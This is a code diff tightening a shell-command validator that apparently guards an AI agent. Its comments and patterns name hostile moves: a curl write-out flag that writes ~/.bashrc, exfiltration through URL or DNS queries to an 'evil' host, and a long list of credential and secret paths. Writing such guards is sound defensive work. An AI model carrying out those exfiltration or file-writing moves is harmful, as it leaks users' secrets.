@@ -35,11 +35,12 @@ function git(args) {
 
 // ps e / ps eww print every process's environment (secrets). "-e" (all processes) is fine.
 const psNoEnv = (a) => !a.some((x) => (!x.startsWith('-') && /e/.test(x)) || /^--?(env|environ)/.test(x));
-// curl: a GET to the screen. No body, upload, headers or file.
+// curl: a GET to the screen. No body, upload, headers or file. No -w either: since curl 8.3
+// `-w '%output{~/.bashrc}…'` writes a file.
 const CURL_FLAGS = new Set(['-s', '-S', '-sS', '-f', '-fs', '-sf', '-fsS', '-sSf', '-I', '-i', '-L', '-sL', '-sSL', '-v', '--silent', '--show-error', '--fail', '--head', '--include', '--location', '--compressed']);
 const curl = (a) => {
   for (let i = 0; i < a.length; i++) {
-    if (['-m', '--max-time', '--connect-timeout', '-w', '--write-out'].includes(a[i])) i++;
+    if (['-m', '--max-time', '--connect-timeout'].includes(a[i])) i++;
     else if (isFlag(a[i]) ? !CURL_FLAGS.has(a[i]) : !/^https?:\/\//.test(a[i])) return false;
   }
   return true;
@@ -86,6 +87,8 @@ const SECRET = [
   /(^|\/)data(\/|$)/, /(^|\/)auth(\/|$)/, /\.pem$/, /\.key$/, /token/i, /secret/i, /passw/i, /gnupg/, /\.aws/,
   /\.kube/, /keyring/i, /\.claude/, /(^|[/~])\.config(\/|$)/, /_key(\.|$)/i, /api[-_]?key/i, /mcp\.json/,
   /(^|\/)proc\/(\d+|self|thread-self)(\/|$)/, /environ/i,
+  /\.docker/, /\.npmrc/, /\.pypirc/, /_history/, /\.mozilla/, /\.thunderbird/, /\.password-store/, /\.azure/,
+  /\.terraform\.d/, /(^|[/~])\.local\/share(\/|$)/, /library\/(keychains|cookies|application support)/, /(^|\/)snap\//,
   /\/\.[^/]*[*?[]/, /^\.[^/]*[*?[]/, /^~\/?$/, /^\/(home|root)?\/?$/,
 ];
 
@@ -168,8 +171,22 @@ export function isReadOnly(line) {
     if (!prog || !Object.hasOwn(READ_ONLY, prog) || !READ_ONLY[prog](rest)) return false;
     if (NAMES_ONLY.has(prog)) return true;
     // A program that prints contents: no glob (cat dat?/x hides "data") and no secret path.
-    return !globbed && !rest.some((a) => SECRET.some((re) => re.test(a)));
+    // Lowercase first: on macOS ~/.assistant/DATA/MCP.JSON is the same file as data/mcp.json.
+    return !globbed && !rest.some((a) => SECRET.some((re) => re.test(a.toLowerCase())));
   });
+}
+
+// Read-only programs that reach other machines. A read-only command can still carry data out
+// in its address (curl https://evil/?d=…, nslookup <data>.evil) or reach the home network.
+const NET = { curl: any, nslookup: any, dig: any, host: any, ping: any, getent: any, npm: (a) => a[0] === 'view' };
+
+// The parts of a line that go out to the network: [{ prog, urls }]. null when unparsable.
+export function netParts(line) {
+  const cmds = parse(String(line ?? ''));
+  if (!cmds) return null;
+  return cmds.map((ws) => ws.flatMap((w) => (typeof w === 'string' ? [w] : w.glob !== undefined ? [w.glob] : [])))
+    .filter(([p, ...rest]) => p && Object.hasOwn(NET, p) && NET[p](rest))
+    .map(([prog, ...rest]) => ({ prog, urls: rest.filter((a) => /^https?:\/\//i.test(a)) }));
 }
 
 // With freeShell (the gateway runs as its own user): commands run without asking unless they
